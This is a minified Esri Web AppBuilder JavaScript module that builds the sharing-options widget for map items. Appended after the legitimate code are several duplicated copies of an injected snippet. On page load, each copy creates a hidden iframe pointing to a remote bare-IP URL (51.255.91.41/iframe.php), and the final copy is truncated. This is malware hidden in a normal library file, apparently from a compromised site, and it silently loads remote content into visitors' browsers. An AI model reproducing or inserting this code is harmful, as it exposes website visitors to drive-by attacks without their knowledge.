// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:jimu/dijit/templates/ShareOptions.html":'\x3cdiv class\x3d"shareOptions"\x3e\r\n  \x3cdiv class\x3d"shareOptionsWrapper"\x3e\r\n    \x3cdiv class\x3d"subTitle"\x3e${nls.shareMap}\x3c/div\x3e\r\n    \x3cdiv class\x3d"tips"\x3e${nls.shareMapTips}\x3c/div\x3e\r\n    \x3cdiv id\x3d"share-everyone-check_div" class\x3d"shareOptionItems" data-dojo-attach-point\x3d"share-everyone-check_div"\x3e\r\n      \x3cinput id\x3d"share-everyone-check" data-dojo-attach-point\x3d"shareEveryoneCheck" data-dojo-type\x3d"dijit/form/CheckBox" type\x3d"checkbox"/\x3e\r\n      \x3clabel id\x3d"share-everyone-check-label" for\x3d"share-everyone-check" class\x3d"labels"\x3e${nls.everyone}\x3c/label\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv id\x3d"share-account-check_div" class\x3d"shareOptionItems displaynone" data-dojo-attach-point\x3d"share-account-check_div"\x3e\r\n      \x3cinput id\x3d"share-account-check" data-dojo-attach-point\x3d"share-account-check" data-dojo-type\x3d"dijit/form/CheckBox" type\x3d"checkbox"/\x3e\r\n      \x3clabel id\x3d"share-account-check-label" for\x3d"share-account-check" class\x3d"labels"\x3e\x3c/label\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv id\x3d"share-groups-div" class\x3d"shareOptionItems displaynone" data-dojo-attach-point\x3d"share-groups-div"\x3e\r\n      \x3cinput id\x3d"share-groups-check" data-dojo-attach-point\x3d"shareGroupsCheck" data-dojo-type\x3d"dijit/form/CheckBox" type\x3d"checkbox"/\x3e\r\n      \x3clabel id\x3d"share-groups-check-label" for\x3d"share-groups-check" class\x3d"labels"\x3e${nls.theseGroups}\x3c/label\x3e\r\n      \x3cdiv class\x3d"share-groups-wrapper"\x3e\r\n        \x3cdiv data-dojo-type\x3d"dijit/layout/BorderContainer" gutters\x3d"false" design\x3d"headline" class\x3d"borderContainer"\x3e\r\n          \x3cdiv id\x3d"share-groups-list" class\x3d"share-groups-list" dojotype\x3d"dijit.layout.ContentPane" region\x3d"middle" splitter\x3d"false"\x3e\x3c/div\x3e\r\n        \x3c/div\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e\r\n'}});
define("dojo/_base/declare dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/_base/lang esri/lang dojo/_base/array dojo/dom-style dojo/on dojo/dom dojo/query dojo/topic dojo/text!./templates/ShareOptions.html jimu/shareUtils dijit/form/Textarea dijit/form/CheckBox dijit/layout/BorderContainer".split(" "),function(u,v,w,x,m,y,r,h,p,e,z,A,B,q){return u([v,w,x],{templateString:B,declaredClass:"jimu.dijit.ShareOptions",postMixInProperties:function(){this.inherited(arguments);
this.nls=window.jimuNls.shareOptions},constructor:function(a){this.portalUrl=a},startup:function(){q.getShareInfo(this.portalUrl).then(m.hitch(this,function(a){this._initShow(a);this.own(p(e.byId("share-everyone-check"),"change",m.hitch(this,this.clickEveryone)))}))},_initShow:function(a){this.shareInfo=a;this.shareInfo.items=[this.shareInfo.item];this.shareInfo.sortField="title";(this.shareInfo.userRole.isAdmin()||this.shareInfo._roleCanUpdateItems&&this.shareInfo._roleCanShare||this.shareInfo._roleCanShareOthersItems)&&
this.shareInfo.itemUser?this.showAdmin(this.shareInfo.user.groups,this.shareInfo.itemUser,this.shareInfo.adminGroups):this.shareInfo.user&&q._isUserOwnTheApp(this.shareInfo.user)?this.show(this.shareInfo.user.groups):this.shareInfo.user&&("public"===this.shareInfo.item.access||"shared"===this.shareInfo.item.access||"org"===this.shareInfo.item.access&&this.shareInfo.currentUser.orgId)?this.showGroups(this.shareInfo.user.groups):this.show(this.shareInfo.user.groups)},clear:function(){e.byId("share-groups-list").innerHTML=
"";e.byId("share-everyone-check").setAttribute("value",!1);e.byId("share-account-check").setAttribute("value",!1);e.byId("share-groups-check").setAttribute("value",!1);h.set(e.byId("share-everyone-check_div"),"display","none");h.set(e.byId("share-account-check_div"),"display","none");this.shareInfo.shareType="item"},showAdmin:function(a,b,c){this.shareInfo.itemUser=b;this.shareInfo.userGroups=r.filter(a||[],m.hitch(this,function(){return!this.shareInfo.item.capabilities||!this.shareInfo.item.capabilities.length}));
this.shareInfo.userGroups.sort(m.hitch(this,this._sortFunc));this.shareInfo.adminGroups=this.filterAdminGroups(c);this.checkForAccount("admin")},filterAdminGroups:function(a){if(a){for(var b=[],c=0;c<this.shareInfo.user.groups.length;c++)b.push(this.shareInfo.user.groups[c].id);for(var d=[],c=0;c<a.length;c++)-1!==r.indexOf(b,a[c].id)||a[c].capabilities&&a[c].capabilities.length||d.push(a[c]);return d}return null},showGroups:function(a){this.shareInfo.userGroups=this.filterOwnedGroups(a);this.shareInfo.userGroups&&
this.shareInfo.userGroups.sort(m.hitch(this,this._sortFunc));this.clear();this.shareInfo.shareType="group";this.checkForAccount("group")},filterOwnedGroups:function(a){if(a){for(var b=[],c,d=0;d<a.length;d++)c=a[d],!c.userMembership||"owner"!==c.userMembership.memberType&&"admin"!==c.userMembership.memberType||c.capabilities&&c.capabilities.length||b.push(c);return b}return null},show:function(a){this.shareInfo.userGroups=this.filterViewOnlyGroups(a);this.shareInfo.userGroups.sort(m.hitch(this,this._sortFunc));
this.checkForAccount("item")},filterViewOnlyGroups:function(a){if(a){for(var b=[],c,d=0;d<a.length;d++)c=a[d],c.capabilities&&c.capabilities.length||(!c.userMembership||"owner"!==c.userMembership.memberType&&"admin"!==c.userMembership.memberType)&&y.isDefined(c.isViewOnly)&&c.isViewOnly||b.push(c);return b}return null},checkForAccount:function(a){e.byId("share-account-check-label").innerHTML=this.shareInfo.organization.name;!this.shareInfo._isCustomRole||this.shareInfo._roleCanShareToOrg||this.shareInfo._roleCanShareOthersItemsToOrg||
h.set(e.byId("share-account-check_div"),"display","none");this.clear();this.shareInfo.shareType=a;var b=this.shareInfo.items[0];this.shareInfo.lowestAccess=this.findLowestAccessLevel(this.shareInfo.items);q.getItemById(b,this.portalUrl).then(m.hitch(this,function(a){b.sharing=a.sharing;"admin"===this.shareInfo.shareType?q.getItemByUserAndItemId(b,this.shareInfo.itemUser,this.shareInfo.user,this.portalUrl).then(m.hitch(this,function(a){b.sharing=a.sharing;this.buildAdminList()})):"group"===this.shareInfo.shareType?
q.getItemsGroups(b,this.portalUrl).then(m.hitch(this,function(a){var c=[];if(a.admin)for(var d=0;d<a.admin.length;d++)c.push(a.admin[d].id);b.sharing={groups:c};this.buildGroupList()})):"item"===this.shareInfo.shareType&&q.getItemByUserAndItemId(b,this.shareInfo.itemUser,this.shareInfo.user,this.portalUrl).then(m.hitch(this,function(a){b.sharing=a.sharing;this.buildList()}))}))},buildAdminList:function(){var a,b,c;if(this.shareInfo.user.groups&&0<this.shareInfo.user.groups.length||this.shareInfo.adminGroups&&
0<this.shareInfo.adminGroups.length&&1<this.shareInfo.lowestAccess)!this.shareInfo._isCustomRole||this.shareInfo._roleCanShareToGroup||this.shareInfo._roleCanShareOthersItemsToGroup?h.set(e.byId("share-groups-div"),"display","block"):h.set(e.byId("share-groups-div"),"display","none");this.shareInfo.itemsAreSharedToGroups=",";var d=[],g=null,f=null;b=[];for(a=0;a<this.shareInfo.items.length;a++)if(g=this.shareInfo.items[a],g.sharing)for(c=0;c<g.sharing.groups.length;c++)if(f=g.sharing.groups[c],-1===
this.shareInfo.itemsAreSharedToGroups.indexOf(","+f+","))this.shareInfo.itemsAreSharedToGroups+=f+",",b=[],b[0]=f,b[1]=1,d[d.length]=b;else for(b=0;b<d.length;b++)if(d[b][0]===f){d[b][1]+=1;break}g="";c=!1;var k,l;for(a=0;a<this.shareInfo.user.groups.length;a++){f=this.shareInfo.user.groups[a];k="";l=this.shareInfo.items.length;if(-1<this.shareInfo.itemsAreSharedToGroups.indexOf(","+f.id+","))for(k="checked",c=!0,b=0;b<d.length;b++)if(d[b][0]===f.id){l=d[b][1];break}g=l<this.shareInfo.items.length?
g+('\x3cdiv id\x3d"img_group_'+a+"_div\" style\x3d\"display:block;\"\x3e\x3ctable cellpadding\x3d'0' cellspacing\x3d'0' class\x3d'share-groups-table'\x3e\x3ctr\x3e\x3ctd width\x3d'17' valign\x3d'bottom'\x3e\x3cimg id\x3d\"img_group_"+a+'" src\x3d"'+this._checkboxImgUrl+'" border\x3d"0"\x3e\x3c/td\x3e\x3ctd\x3e'+f.title+'\x3c/td\x3e\x3c/tr\x3e\x3c/table\x3e\x3c/div\x3e\x3cdiv id\x3d"group_'+a+"_div\" style\x3d\"display:none;\"\x3e\x3ctable cellpadding\x3d'0' cellspacing\x3d'0' class\x3d'share-groups-table'\x3e\x3ctr\x3e\x3ctd width\x3d'17' valign\x3d'bottom'\x3e\x3cinput id\x3d\"group_"+
a+'" '+k+' value\x3d"'+f.id+'" type\x3d"checkbox" class\x3d\'share-groups-input-checkbox\' dojoType\x3d"dijit.form.Checkbox" /\x3e\x3c/td\x3e\x3ctd\x3e\x3clabel for\x3d\'group_'+a+"' class\x3d'labels'\x3e"+f.title+"\x3c/label\x3e"):g+('\x3cdiv id\x3d"group_'+a+"_div\" style\x3d\"display:block;\"\x3e\x3ctable cellpadding\x3d'0' cellspacing\x3d'0' class\x3d'share-groups-table'\x3e\x3ctr\x3e\x3ctd width\x3d'17' valign\x3d'bottom'\x3e\x3cinput id\x3d\"group_"+a+'" '+k+' value\x3d"'+f.id+'" type\x3d"checkbox" class\x3d\'share-groups-input-checkbox\' dojoType\x3d"dijit.form.Checkbox" /\x3e\x3c/td\x3e\x3ctd\x3e\x3clabel for\x3d\'group_'+
a+"' class\x3d'labels'\x3e"+f.title+"\x3c/label\x3e");g=this._addOpenDataStr(f,g);g+="\x3c/td\x3e\x3c/tr\x3e\x3c/table\x3e\x3c/div\x3e"}if(this.shareInfo.adminGroups&&this.shareInfo.adminGroups.length&&1<this.shareInfo.lowestAccess)for(g+='\x3cdiv style\x3d"display:block;"\x3e\x3chr/\x3e\x3c/div\x3e',b=0;b<this.shareInfo.adminGroups.length;b++){f=this.shareInfo.adminGroups[b];k="";l=this.shareInfo.items.length;if(-1<this.shareInfo.itemsAreSharedToGroups.indexOf(","+f.id+",")){k="checked";c=!0;for(var n=
0;n<d.length;n++)if(d[n][0]===f.id){l=d[n][1];break}}g=l<this.shareInfo.items.length?g+('\x3cdiv id\x3d"img_group_'+(b+a)+"_div\" style\x3d\"display:block;\"\x3e\x3ctable cellpadding\x3d'0' cellspacing\x3d'0' class\x3d'share-groups-table'\x3e\x3ctr\x3e\x3ctd width\x3d'17' valign\x3d'bottom'\x3e\x3cimg id\x3d\"img_group_"+(b+a)+'" src\x3d"'+this._checkboxImgUrl+'" border\x3d"0"\x3e\x3c/td\x3e\x3ctd\x3e'+f.title+'\x3c/td\x3e\x3c/tr\x3e\x3c/table\x3e\x3c/div\x3e\x3cdiv id\x3d"group_'+(b+a)+"_div\" style\x3d\"display:none;\"\x3e\x3ctable cellpadding\x3d'0' cellspacing\x3d'0'\x3e\x3ctr\x3e\x3ctd width\x3d'17' valign\x3d'bottom'\x3e\x3cinput id\x3d\"group_"+
(b+a)+'" '+k+' value\x3d"'+f.id+'" type\x3d"checkbox"class\x3d\'share-groups-input-checkbox\' dojoType\x3d"dijit.form.Checkbox" /\x3e\x3c/td\x3e\x3ctd\x3e\x3clabel for\x3d\'group_'+a+"'\x3e"+f.title+"\x3c/label\x3e"):g+('\x3cdiv id\x3d"group_'+(b+a)+"_div\" style\x3d\"display:block;\"\x3e\x3ctable cellpadding\x3d'0' cellspacing\x3d'0' class\x3d'share-groups-table'\x3e\x3ctr\x3e\x3ctd width\x3d'17' valign\x3d'bottom'\x3e\x3cinput id\x3d\"group_"+(b+a)+'" '+k+' value\x3d"'+f.id+'" type\x3d"checkbox"class\x3d\'share-groups-input-checkbox\' dojoType\x3d"dijit.form.Checkbox" /\x3e\x3c/td\x3e\x3ctd\x3e\x3clabel for\x3d\'group_'+
a+"'\x3e"+f.title+"\x3c/label\x3e");g=this._addOpenDataStr(f,g);g+="\x3c/td\x3e\x3c/tr\x3e\x3c/table\x3e\x3c/div\x3e"}this.own(p(e.byId("share-groups-list"),"click",m.hitch(this,this.checkGroup)));e.byId("share-groups-list").innerHTML=g;if(this.shareInfo.organization){for(a=d=0;a<this.shareInfo.items.length;a++)this.shareInfo.items[a].sharing&&"org"===this.shareInfo.items[a].sharing.access&&d++;!this.shareInfo._isCustomRole||this.shareInfo._roleCanShareToOrg||this.shareInfo._roleCanShareOthersItemsToOrg?
(0===d?(dijit.byId("share-account-check").set("checked",!1),dijit.byId("share-account-check").set("disabled",!1)):d===this.shareInfo.items.length?(dijit.byId("share-account-check").set("checked",!0),dijit.byId("share-account-check").set("disabled",!1)):(dijit.byId("share-account-check").set("checked",!0),dijit.byId("share-account-check").set("disabled",!0)),h.set(e.byId("share-account-check_div"),"display","block")):(dijit.byId("share-account-check").set("disabled",!0),h.set(e.byId("share-account-check_div"),
"display","none"))}if(!this.shareInfo.organization||this.shareInfo._orgUserCanSharePublicOrOverride){for(a=d=0;a<this.shareInfo.items.length;a++)this.shareInfo.items[a].sharing&&"public"===this.shareInfo.items[a].sharing.access&&d++;0===d?(dijit.byId("share-everyone-check").set("checked",!1),h.set(e.byId("share-everyone-check_div"),"display","block")):(d===this.shareInfo.items.length?(dijit.byId("share-everyone-check").set("checked",!0),h.set(e.byId("share-everyone-check_div"),"display","block")):
dijit.byId("share-everyone-check").set("checked",!0),this.shareInfo.organization&&(!this.shareInfo._isCustomRole||this.shareInfo._roleCanShareToOrg||this.shareInfo._roleCanShareOthersItemsToOrg)&&(dijit.byId("share-account-check").set("checked",!0),dijit.byId("share-account-check").set("disabled",dijit.byId("share-everyone-check").get("checked"))));this.clickEveryone()}else dijit.byId("share-everyone-check").set("checked",!1),h.set(e.byId("share-everyone-check_div"),"display","none");c?dijit.byId("share-groups-check").set("checked",
!0):dijit.byId("share-groups-check").set("checked",!1);this.own(p(e.byId("share-groups-check"),"click",m.hitch(this,this.checkGroups)));this.shareInfo.organization&&(!this.shareInfo._isCustomRole||this.shareInfo._roleCanShareToOrg||this.shareInfo._roleCanShareOthersItemsToOrg)&&this.own(p(e.byId("share-account-check"),"click",m.hitch(this,this.clickAccount)))},buildList:function(){var a,b;!this.shareInfo._isCustomRole||this.shareInfo._roleCanShareToGroup||this.shareInfo._roleCanShareOthersItemsToGroup?
this.shareInfo.userGroups&&0<this.shareInfo.userGroups.length&&h.set(e.byId("share-groups-div"),"display","block"):h.set(e.byId("share-groups-div"),"display","none");this.shareInfo.itemsAreSharedToGroups=",";var c=[];for(a=0;a<this.shareInfo.items.length;a++){var d=this.shareInfo.items[a];if(d.sharing)for(var g=0;g<d.sharing.groups.length;g++){var f=d.sharing.groups[g];if(-1===this.shareInfo.itemsAreSharedToGroups.indexOf(","+f+","))this.shareInfo.itemsAreSharedToGroups+=f+",",b=[],b[0]=f,b[1]=1,
c[c.length]=b;else for(b=0;b<c.length;b++)if(c[b][0]===f){c[b][1]+=1;break}}}g="";d=!1;for(a=0;a<this.shareInfo.userGroups.length;a++){var f=this.shareInfo.userGroups[a],k="",l=this.shareInfo.items.length;if(-1<this.shareInfo.itemsAreSharedToGroups.indexOf(","+f.id+","))for(k="checked",d=!0,b=0;b<c.length;b++)if(c[b][0]===f.id){l=c[b][1];break}g=l<this.shareInfo.items.length?g+('\x3cdiv id\x3d"img_group_'+a+"_div\" style\x3d\"display:block;\"\x3e\x3ctable cellpadding\x3d'0' cellspacing\x3d'0' class\x3d'share-groups-table'\x3e\x3ctr\x3e\x3ctd width\x3d'17' valign\x3d'bottom'\x3e\x3cimg id\x3d\"img_group_"+
a+'" src\x3d"'+this._checkboxImgUrl+'" border\x3d"0"\x3e\x3c/td\x3e\x3ctd\x3e'+f.title+'\x3c/td\x3e\x3c/tr\x3e\x3c/table\x3e\x3c/div\x3e\x3cdiv id\x3d"group_'+a+"_div\" style\x3d\"display:none;\"\x3e\x3ctable cellpadding\x3d'0' cellspacing\x3d'0'\x3e\x3ctr\x3e\x3ctd width\x3d'17' valign\x3d'bottom'\x3e\x3cinput id\x3d\"group_"+a+'" '+k+' value\x3d"'+f.id+'" type\x3d"checkbox"class\x3d\'share-groups-input-checkbox\' dojoType\x3d"dijit.form.Checkbox" /\x3e\x3c/td\x3e\x3ctd\x3e\x3clabel for\x3d\'group_'+
a+"'\x3e"+f.title+"\x3c/label\x3e"):g+('\x3cdiv id\x3d"group_'+a+"_div\" style\x3d\"display:block;\"\x3e\x3ctable cellpadding\x3d'0' cellspacing\x3d'0' class\x3d'share-groups-table'\x3e\x3ctr\x3e\x3ctd width\x3d'17' valign\x3d'bottom'\x3e\x3cinput id\x3d\"group_"+a+'" '+k+' value\x3d"'+f.id+'" type\x3d"checkbox"class\x3d\'share-groups-input-checkbox\' dojoType\x3d"dijit.form.Checkbox" /\x3e\x3c/td\x3e\x3ctd\x3e\x3clabel for\x3d\'group_'+a+"'\x3e"+f.title+"\x3c/label\x3e");g=this._addOpenDataStr(f,
g);g+="\x3c/td\x3e\x3c/tr\x3e\x3c/table\x3e\x3c/div\x3e"}this.own(p(e.byId("share-groups-list"),"click",m.hitch(this,this.checkGroup)));e.byId("share-groups-list").innerHTML=g;if(this.shareInfo.organization&&this.shareInfo.userRole&&(!this.shareInfo._isCustomRole||this.shareInfo._roleCanShareToOrg||this.shareInfo._roleCanShareOthersItemsToOrg)){for(a=c=0;a<this.shareInfo.items.length;a++)this.shareInfo.items[a].sharing&&"org"===this.shareInfo.items[a].sharing.access&&c++;0===c?dijit.byId("share-account-check").set("checked",
!1):dijit.byId("share-account-check").set("checked",!0);h.set(e.byId("share-account-check_div"),"display","block")}if(!this.shareInfo.organization||this.shareInfo._orgUserCanSharePublicOrOverride){for(a=c=0;a<this.shareInfo.items.length;a++)this.shareInfo.items[a].sharing&&"public"===this.shareInfo.items[a].sharing.access&&c++;0===c?(dijit.byId("share-everyone-check").set("checked",!1),h.set(e.byId("share-everyone-check_div"),"display","block")):(c===this.shareInfo.items.length?(dijit.byId("share-everyone-check").set("checked",
!0),h.set(e.byId("share-everyone-check_div"),"display","block")):dijit.byId("share-everyone-check").set("checked",!0),this.shareInfo.organization&&this.shareInfo.userRole&&(!this.shareInfo._isCustomRole||this.shareInfo._roleCanShareToOrg||this.shareInfo._roleCanShareOthersItemsToOrg)&&(dijit.byId("share-account-check").set("checked",!0),h.set(e.byId("share-everyone-check_div"),"display","block")));this.clickEveryone()}else if(this.shareInfo.organization&&!this.shareInfo.organization.canSharePublic){for(a=
c=0;a<this.shareInfo.items.length;a++)this.shareInfo.items[a].sharing&&"public"===this.shareInfo.items[a].sharing.access&&c++;c?(dijit.byId("share-everyone-check").set("checked",!0),this.shareInfo.organization&&this.shareInfo.userRole&&(!this.shareInfo._isCustomRole||this.shareInfo._roleCanShareToOrg||this.shareInfo._roleCanShareOthersItemsToOrg)&&(dijit.byId("share-account-check").set("checked",!0),h.set(e.byId("share-account-check_div"),"display","block"))):(dijit.byId("share-everyone-check").set("checked",
!1),h.set(e.byId("share-everyone-check_div"),"display","none"))}else dijit.byId("share-everyone-check").set("checked",!1),h.set(e.byId("share-everyone-check_div"),"display","none");d?dijit.byId("share-groups-check").set("checked",!0):dijit.byId("share-groups-check").set("checked",!1);this.own(p(e.byId("share-groups-check"),"click",m.hitch(this,this.checkGroups)));this.shareInfo.organization&&(!this.shareInfo._isCustomRole||this.shareInfo._roleCanShareToOrg||this.shareInfo._roleCanShareOthersItemsToOrg)&&
this.own(p(e.byId("share-account-check"),"click",m.hitch(this,this.clickAccount)))},buildGroupList:function(){var a,b;!this.shareInfo._isCustomRole||this.shareInfo._roleCanShareToGroup||this.shareInfo._roleCanShareOthersItemsToGroup?0<this.shareInfo.userGroups.length&&h.set(e.byId("share-groups-div"),"display","block"):h.set(e.byId("share-groups-div"),"display","none");this.shareInfo.itemsAreSharedToGroups=",";var c=[];for(a=0;a<this.shareInfo.items.length;a++){var d=this.shareInfo.items[a];if(d.sharing)for(var g=
0;g<d.sharing.groups.length;g++){var f=d.sharing.groups[g];if(-1===this.shareInfo.itemsAreSharedToGroups.indexOf(","+f+","))this.shareInfo.itemsAreSharedToGroups+=f+",",b=[],b[0]=f,b[1]=1,c[c.length]=b;else for(b=0;b<c.length;b++)if(c[b][0]===f){c[b][1]+=1;break}}}var d="",g=!1,k,l;for(a=0;a<this.shareInfo.userGroups.length;a++){f=this.shareInfo.userGroups[a];k="";l=this.shareInfo.items.length;if(-1<this.shareInfo.itemsAreSharedToGroups.indexOf(","+f.id+","))for(k="checked",g=!0,b=0;b<c.length;b++)if(c[b][0]===
f.id){l=c[b][1];break}d=l<this.shareInfo.items.length?d+('\x3cdiv id\x3d"img_group_'+a+"_div\" style\x3d\"display:block;\"\x3e\x3ctable cellpadding\x3d'0' cellspacing\x3d'0' class\x3d'share-groups-table'\x3e\x3ctr\x3e\x3ctd width\x3d'17' valign\x3d'bottom'\x3e\x3cimg id\x3d\"img_group_"+a+'" src\x3d"'+this._checkboxImgUrl+'" border\x3d"0"\x3e\x3c/td\x3e\x3ctd\x3e'+f.title+'\x3c/td\x3e\x3c/tr\x3e\x3c/table\x3e\x3c/div\x3e\x3cdiv id\x3d"group_'+a+"_div\"style\x3d\"display:none;\"\x3e\x3ctable cellpadding\x3d'0' cellspacing\x3d'0'\x3e\x3ctr\x3e\x3ctd width\x3d'17' valign\x3d'bottom'\x3e\x3cinput id\x3d\"group_"+
a+'" '+k+' value\x3d"'+f.id+'" type\x3d"checkbox"class\x3d\'share-groups-input-checkbox\' dojoType\x3d"dijit.form.Checkbox" /\x3e\x3c/td\x3e\x3ctd\x3e\x3clabel for\x3d\''+f.id+"'\x3e"+f.title+"\x3c/label\x3e"):d+('\x3cdiv id\x3d"group_'+a+"_div\" style\x3d\"display:block;\"\x3e\x3ctable cellpadding\x3d'0' cellspacing\x3d'0' class\x3d'share-groups-table'\x3e\x3ctr\x3e\x3ctd width\x3d'17' valign\x3d'bottom'\x3e\x3cinput id\x3d\"group_"+a+'" '+k+' value\x3d"'+f.id+'" type\x3d"checkbox"class\x3d\'share-groups-input-checkbox\' dojoType\x3d"dijit.form.Checkbox" /\x3e\x3c/td\x3e\x3ctd\x3e\x3clabel for\x3d\'group_'+
a+"'\x3e"+f.title+"\x3c/label\x3e");d=this._addOpenDataStr(f,d);d+="\x3c/td\x3e\x3c/tr\x3e\x3c/table\x3e\x3c/div\x3e"}this.own(p(e.byId("share-groups-list"),"click",m.hitch(this,this.checkGroup)));e.byId("share-groups-list").innerHTML=d;g?dijit.byId("share-groups-check").set("checked",!0):dijit.byId("share-groups-check").set("checked",!1);this.own(p(e.byId("share-groups-check"),"click",m.hitch(this,this.checkGroups)))},share:function(a){"group"===this.shareInfo.shareType?this.shareItemToGroups():
"admin"===this.shareInfo.shareType?this.shareItemAsAdmin(a):this.shareItem(a)},checkGroup:function(a){-1<a.target.id.indexOf("img_group_")&&(h.set(e.byId(a.target.id+"_div"),"display","none"),h.set(e.byId(a.target.id.substring(4,a.target.id.length)+"_div"),"display","block"));!0===a.target.checked&&-1<a.target.id.indexOf("group_")&&dijit.byId("share-groups-check").set("checked",!0)},checkGroups:function(){},clickEveryone:function(){var a=dijit.byId("share-everyone-check").get("checked");if(!0===a){var b=
e.byId("share-account-check_div");this.shareInfo.organization&&b&&"block"===h.get(b,"display")&&(dijit.byId("share-account-check").set("checked",!0),dijit.byId("share-account-check").set("disabled",!0))}else this.shareInfo.organization&&this.shareInfo.userRole&&(!this.shareInfo._isCustomRole||this.shareInfo._roleCanShareToOrg||this.shareInfo._roleCanShareOthersItemsToOrg)&&h.set(e.byId("share-account-check_div"),"display","block"),dijit.byId("share-account-check").set("disabled",!1);A.publish("ShareOptions/onClickEveryone",
a)},clickAccount:function(){!0===dijit.byId("share-account-check").get("checked")?(this.shareInfo._orgUserCanSharePublicOrOverride&&("none"===h.get(e.byId("share-everyone-check_div"),"display")&&h.set(e.byId("share-everyone-check_div"),"display","block"),dijit.byId("share-everyone-check").set("checked",!1)),dijit.byId("share-account-check").set("checked",!0)):dijit.byId("share-account-check").set("checked",!1)},shareItemAsAdmin:function(){var a="",b="";r.forEach(this.shareInfo.items,function(c){a+=
b+c.id;b=","});var c=!1,d=!1;e.byId("share-everyone-check_div")&&"block"===h.get(e.byId("share-everyone-check_div"),"display")&&(c=dijit.byId("share-everyone-check").get("checked"));e.byId("share-account-check_div")&&"block"===h.get(e.byId("share-account-check_div"),"display")&&(d=dijit.byId("share-account-check").get("checked"));var g="",f="",k="",l="",n=0;if(dijit.byId("share-groups-check").get("checked")){var t;if(this.shareInfo.user.groups&&this.shareInfo.user.groups.length)for(n=0;n<this.shareInfo.user.groups.length;n++)t=
this.shareInfo.user.groups[n].id,"block"===h.get(e.byId("group_"+n+"_div"),"display")&&(e.byId("group_"+n).checked?(g+=k+t,k=","):(f+=l+t,l=","));if(this.shareInfo.adminGroups&&this.shareInfo.adminGroups.length&&1<this.shareInfo.lowestAccess)for(var p=0;p<this.shareInfo.adminGroups.length;p++)t=this.shareInfo.adminGroups[p].id,"block"===h.get(e.byId("group_"+(p+n)+"_div"),"display")&&(e.byId("group_"+(p+n)).checked?(g+=k+t,k=","):(f+=l+t,l=","))}else l="",this.shareInfo.user.groups&&this.shareInfo.user.groups.length&&
r.forEach(this.shareInfo.user.groups,function(a){f+=l+a.id;l=","}),this.shareInfo.adminGroups&&this.shareInfo.adminGroups.length&&1<this.shareInfo.lowestAccess&&r.forEach(this.shareInfo.adminGroups,function(a){f+=l+a.id;l=","});if(0<f.length)for(k={items:a,groups:f},n=0;n<this.shareInfo.items.length;n++)q._unshareItemById(k,this.shareInfo.items[n].id,this.portalUrl).then(m.hitch(this,this.unShareHandler_admin,this.shareInfo.items,a,g,c,d));else this.unShareHandler_admin(this.shareInfo.items,a,g,c,
d)},unShareHandler_admin:function(a,b,c,d,e){var f=a.length,g=function(){f--};b={items:b,groups:c,everyone:d,account:e};for(c=0;c<a.length;c++)d=a[c],this.shareInfo.user.shareItem(b,d.id,d.folderId).then(m.hitch(this,g))},shareItem:function(){var a="",b="";r.forEach(this.shareInfo.items,function(c){a+=b+c.id;b=","});var c=!1,d=!1;e.byId("share-everyone-check_div")&&"block"===h.get(e.byId("share-everyone-check_div"),"display")&&(c=dijit.byId("share-everyone-check").get("checked"));e.byId("share-account-check_div")&&
"block"===h.get(e.byId("share-account-check_div"),"display")&&(d=dijit.byId("share-account-check").get("checked"));var g=dijit.byId("share-groups-check").get("checked"),f="",k="",l="",n="";this.shareInfo.userGroups=this.shareInfo.user.group;g?this.shareInfo.userGroups&&this.shareInfo.userGroups.length&&r.forEach(this.shareInfo.userGroups,function(a,b){a=a.id;"block"===h.get(e.byId("group_"+b+"_div"),"display")&&(e.byId("group_"+b).checked?(f+=l+a,l=","):(k+=n+a,n=","))}):(n="",this.shareInfo.userGroups&&
this.shareInfo.userGroups.length&&r.forEach(this.shareInfo.userGroups,function(a){k+=n+a.id;n=","}));0<k.length?(g={items:a,groups:k},this.shareInfo.itemUser&&null!==this.shareInfo.itemUser?q.unshareItemsByUser(this.shareInfo.itemUser.username?this.shareInfo.itemUser.username:this.shareInfo.itemUser.email,g,this.portalUrl).then(m.hitch(this,this.unShareHandler_item,this.shareInfo.itemUser,a,f,c,d)):q.unshareItems(this.shareInfo.itemUser,g,this.portalUrl).then(m.hitch(this,this.unShareHandler_item,
this.shareInfo.itemUser,a,f,c,d))):this.unShareHandler_item(this.shareInfo.itemUser,a,f,c,d)},unShareHandler_item:function(a,b,c,d,e){b={items:b,groups:c,everyone:d,account:e};a&&null!==a?q.shareItemsByUser(a.username?a.username:a.email,b,this.portalUrl).then(m.hitch()):q.shareItems(a,b,this.portalUrl).then()},findLowestAccessLevel:function(a){for(var b=3,c,d,e=0;e<a.length;e++)(d=a[e].access)||(d="private"),1===d.length&&(d=d[0]),"public"===d?c=3:"org"===d?c=2:"shared"===d?c=1:"private"===d&&(c=
0),c<b&&(b=c);return b},_sortFunc:function(a,b){a=a[this.shareInfo.sortField].toLowerCase();b=b[this.shareInfo.sortField].toLowerCase();return null===a||null===b||a===b?0:a<b?-1:1},_addOpenDataStr:function(a,b){a.isOpenData&&!q.portal.isPortal&&(b+=" "+this.i18n.openData);return b},_clearGroupCheckboxes:function(){if(!1===dijit.byId("share-groups-check").get("checked"))for(var a=z(".share-groups-input-checkbox"),b=0,c=a.length;b<c;b++)a[b].setAttribute("value",!1)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
